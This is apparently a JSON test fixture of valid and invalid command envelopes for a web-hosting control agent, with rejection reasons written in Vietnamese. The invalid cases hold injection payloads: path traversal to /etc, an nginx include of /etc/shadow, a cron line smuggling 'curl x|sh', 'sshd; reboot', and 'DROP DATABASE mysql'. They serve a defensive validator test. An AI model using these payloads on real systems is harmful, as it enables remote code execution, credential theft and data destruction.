@@ -1,0 +1,380 @@
+{
+  "valid": [
+    {
+      "v": 1,
+      "op": "nginx.vhost.apply",
+      "op_id": "01938a0f-0002-7000-8000-00000f000002:3:1",
+      "params": {
+        "account": {
+          "username": "anphat",
+          "uid": 20001
+        },
+        "website_uuid": "01938a06-0002-7000-8000-000006000002",
+        "server_names": [
+          "shop.anphat.vn"
+        ],
+        "document_root": "public",
+        "php_socket": "/run/itso/php/anphat-1a2b3c4d.sock",
+        "tls": null,
+        "client_max_body_size": "64m",
+        "extra_headers": {
+          "X-Frame-Options": "SAMEORIGIN"
+        },
+        "suspended": false
+      },
+      "deadline": "2026-11-20T08:25:00+07:00",
+      "ts": 1795655700,
+      "nonce": "n0nce_7Hk2pQ9xVb3mN6tR",
+      "requested_by": {
+        "user_uuid": "01938a01-0003-7000-8000-000001000003",
+        "role": "USER"
+      }
+    },
+    {
+      "v": 1,
+      "op": "php.pool.apply",
+      "op_id": "01938a0f-0002-7000-8000-00000f000002:2:1",
+      "params": {
+        "account": {
+          "username": "anphat",
+          "uid": 20001
+        },
+        "website_uuid": "01938a06-0002-7000-8000-000006000002",
+        "version": "8.2",
+        "pm_max_children": 6,
+        "memory_limit": "256m",
+        "max_execution_time": 60,
+        "upload_max_filesize": "64m",
+        "disable_functions": [
+          "exec",
+          "shell_exec"
+        ]
+      },
+      "deadline": "2026-11-20T08:25:00+07:00",
+      "ts": 1795655700,
+      "nonce": "n0nce_7Hk2pQ9xVb3mN6tR",
+      "requested_by": {
+        "user_uuid": "01938a01-0003-7000-8000-000001000003",
+        "role": "USER"
+      }
+    },
+    {
+      "v": 1,
+      "op": "fs.list",
+      "op_id": "01938a0f-0002-7000-8000-00000f000002:1:1",
+      "params": {
+        "account": {
+          "username": "anphat",
+          "uid": 20001
+        },
+        "path": "sites/anphat.vn"
+      },
+      "deadline": "2026-11-20T08:25:00+07:00",
+      "ts": 1795655700,
+      "nonce": "n0nce_7Hk2pQ9xVb3mN6tR",
+      "requested_by": {
+        "user_uuid": "01938a01-0003-7000-8000-000001000003",
+        "role": "USER"
+      }
+    },
+    {
+      "v": 1,
+      "op": "cron.apply",
+      "op_id": "01938a0f-0002-7000-8000-00000f000002:1:1",
+      "params": {
+        "account": {
+          "username": "anphat",
+          "uid": 20001
+        },
+        "entries": [
+          {
+            "uuid": "01938a0d-0001-7000-8000-00000d000001",
+            "schedule": "*/15 * * * *",
+            "command": "php artisan schedule:run",
+            "working_dir": "sites/anphat.vn",
+            "enabled": true
+          }
+        ]
+      },
+      "deadline": "2026-11-20T08:25:00+07:00",
+      "ts": 1795655700,
+      "nonce": "n0nce_7Hk2pQ9xVb3mN6tR",
+      "requested_by": {
+        "user_uuid": "01938a01-0003-7000-8000-000001000003",
+        "role": "USER"
+      }
+    },
+    {
+      "v": 1,
+      "op": "db.mysql.create",
+      "op_id": "01938a0f-0002-7000-8000-00000f000002:1:1",
+      "params": {
+        "account": {
+          "username": "anphat",
+          "uid": 20001
+        },
+        "name": "anphat_crm",
+        "charset": "utf8mb4"
+      },
+      "deadline": "2026-11-20T08:25:00+07:00",
+      "ts": 1795655700,
+      "nonce": "n0nce_7Hk2pQ9xVb3mN6tR",
+      "requested_by": {
+        "user_uuid": "01938a01-0003-7000-8000-000001000003",
+        "role": "USER"
+      }
+    },
+    {
+      "v": 1,
+      "op": "account.ensure",
+      "op_id": "01938a0f-0002-7000-8000-00000f000002:1:1",
+      "params": {
+        "account": {
+          "username": "anphat",
+          "uid": 20001
+        },
+        "home_path": "/home/anphat",
+        "shell": "/usr/sbin/nologin",
+        "limits": {
+          "disk_mb": 20480,
+          "inode_limit": 400000,
+          "cpu_percent": 200,
+          "ram_mb": 4096,
+          "tasks_max": 256,
+          "io_weight": 100,
+          "io_read_bps": null,
+          "io_write_bps": null
+        }
+      },
+      "deadline": "2026-11-20T08:25:00+07:00",
+      "ts": 1795655700,
+      "nonce": "n0nce_7Hk2pQ9xVb3mN6tR",
+      "requested_by": {
+        "user_uuid": "01938a01-0003-7000-8000-000001000003",
+        "role": "USER"
+      }
+    }
+  ],
+  "invalid": [
+    {
+      "why": "Op không có trong catalog (exec tùy ý)",
+      "envelope": {
+        "v": 1,
+        "op": "shell.exec",
+        "op_id": "01938a0f-0002-7000-8000-00000f000002:1:1",
+        "params": {
+          "cmd": "id"
+        },
+        "deadline": "2026-11-20T08:25:00+07:00",
+        "ts": 1795655700,
+        "nonce": "n0nce_7Hk2pQ9xVb3mN6tR",
+        "requested_by": {
+          "user_uuid": "01938a01-0003-7000-8000-000001000003",
+          "role": "USER"
+        }
+      }
+    },
+    {
+      "why": "Path traversal trong fs.list",
+      "envelope": {
+        "v": 1,
+        "op": "fs.list",
+        "op_id": "01938a0f-0002-7000-8000-00000f000002:1:1",
+        "params": {
+          "account": {
+            "username": "anphat",
+            "uid": 20001
+          },
+          "path": "../../etc"
+        },
+        "deadline": "2026-11-20T08:25:00+07:00",
+        "ts": 1795655700,
+        "nonce": "n0nce_7Hk2pQ9xVb3mN6tR",
+        "requested_by": {
+          "user_uuid": "01938a01-0003-7000-8000-000001000003",
+          "role": "USER"
+        }
+      }
+    },
+    {
+      "why": "UID ngoài dải hosting",
+      "envelope": {
+        "v": 1,
+        "op": "fs.list",
+        "op_id": "01938a0f-0002-7000-8000-00000f000002:1:1",
+        "params": {
+          "account": {
+            "username": "anphat",
+            "uid": 0
+          },
+          "path": "."
+        },
+        "deadline": "2026-11-20T08:25:00+07:00",
+        "ts": 1795655700,
+        "nonce": "n0nce_7Hk2pQ9xVb3mN6tR",
+        "requested_by": {
+          "user_uuid": "01938a01-0003-7000-8000-000001000003",
+          "role": "USER"
+        }
+      }
+    },
+    {
+      "why": "Username hệ thống",
+      "envelope": {
+        "v": 1,
+        "op": "account.suspend",
+        "op_id": "01938a0f-0002-7000-8000-00000f000002:1:1",
+        "params": {
+          "account": {
+            "username": "root",
+            "uid": 20001
+          },
+          "reason": "x"
+        },
+        "deadline": "2026-11-20T08:25:00+07:00",
+        "ts": 1795655700,
+        "nonce": "n0nce_7Hk2pQ9xVb3mN6tR",
+        "requested_by": {
+          "user_uuid": "01938a01-0003-7000-8000-000001000003",
+          "role": "USER"
+        }
+      }
+    },
+    {
+      "why": "Tham số thừa (additionalProperties)",
+      "envelope": {
+        "v": 1,
+        "op": "fs.list",
+        "op_id": "01938a0f-0002-7000-8000-00000f000002:1:1",
+        "params": {
+          "account": {
+            "username": "anphat",
+            "uid": 20001
+          },
+          "path": ".",
+          "follow_symlinks": true
+        },
+        "deadline": "2026-11-20T08:25:00+07:00",
+        "ts": 1795655700,
+        "nonce": "n0nce_7Hk2pQ9xVb3mN6tR",
+        "requested_by": {
+          "user_uuid": "01938a01-0003-7000-8000-000001000003",
+          "role": "USER"
+        }
+      }
+    },
+    {
+      "why": "Domain chèn cấu hình nginx",
+      "envelope": {
+        "v": 1,
+        "op": "nginx.vhost.apply",
+        "op_id": "01938a0f-0002-7000-8000-00000f000002:1:1",
+        "params": {
+          "account": {
+            "username": "anphat",
+            "uid": 20001
+          },
+          "website_uuid": "01938a06-0002-7000-8000-000006000002",
+          "server_names": [
+            "a.vn;\n include /etc/shadow"
+          ],
+          "document_root": "public"
+        },
+        "deadline": "2026-11-20T08:25:00+07:00",
+        "ts": 1795655700,
+        "nonce": "n0nce_7Hk2pQ9xVb3mN6tR",
+        "requested_by": {
+          "user_uuid": "01938a01-0003-7000-8000-000001000003",
+          "role": "USER"
+        }
+      }
+    },
+    {
+      "why": "Cron chèn dòng mới",
+      "envelope": {
+        "v": 1,
+        "op": "cron.apply",
+        "op_id": "01938a0f-0002-7000-8000-00000f000002:1:1",
+        "params": {
+          "account": {
+            "username": "anphat",
+            "uid": 20001
+          },
+          "entries": [
+            {
+              "uuid": "01938a0d-0001-7000-8000-00000d000001",
+              "schedule": "* * * * *",
+              "command": "php a.php\n* * * * * curl x|sh",
+              "working_dir": ".",
+              "enabled": true
+            }
+          ]
+        },
+        "deadline": "2026-11-20T08:25:00+07:00",
+        "ts": 1795655700,
+        "nonce": "n0nce_7Hk2pQ9xVb3mN6tR",
+        "requested_by": {
+          "user_uuid": "01938a01-0003-7000-8000-000001000003",
+          "role": "USER"
+        }
+      }
+    },
+    {
+      "why": "Dịch vụ ngoài allowlist",
+      "envelope": {
+        "v": 1,
+        "op": "service.control",
+        "op_id": "01938a0f-0002-7000-8000-00000f000002:1:1",
+        "params": {
+          "name": "sshd; reboot",
+          "action": "stop"
+        },
+        "deadline": "2026-11-20T08:25:00+07:00",
+        "ts": 1795655700,
+        "nonce": "n0nce_7Hk2pQ9xVb3mN6tR",
+        "requested_by": {
+          "user_uuid": "01938a01-0003-7000-8000-000001000003",
+          "role": "USER"
+        }
+      }
+    },
+    {
+      "why": "Thiếu nonce",
+      "envelope": {
+        "v": 1,
+        "op": "system.info",
+        "op_id": "01938a0f-0002-7000-8000-00000f000002:1:1",
+        "params": {},
+        "deadline": "2026-11-20T08:25:00+07:00",
+        "ts": 1795655700,
+        "requested_by": {
+          "user_uuid": "01938a01-0003-7000-8000-000001000003",
+          "role": "USER"
+        }
+      }
+    },
+    {
+      "why": "SQL injection tên DB",
+      "envelope": {
+        "v": 1,
+        "op": "db.mysql.drop",
+        "op_id": "01938a0f-0002-7000-8000-00000f000002:1:1",
+        "params": {
+          "account": {
+            "username": "anphat",
+            "uid": 20001
+          },
+          "name": "x; DROP DATABASE mysql",
+          "confirm_name": "x"
+        },
+        "deadline": "2026-11-20T08:25:00+07:00",
+        "ts": 1795655700,
+        "nonce": "n0nce_7Hk2pQ9xVb3mN6tR",
+        "requested_by": {
+          "user_uuid": "01938a01-0003-7000-8000-000001000003",
+          "role": "USER"
+        }
+      }
+    }
+  ]
+}
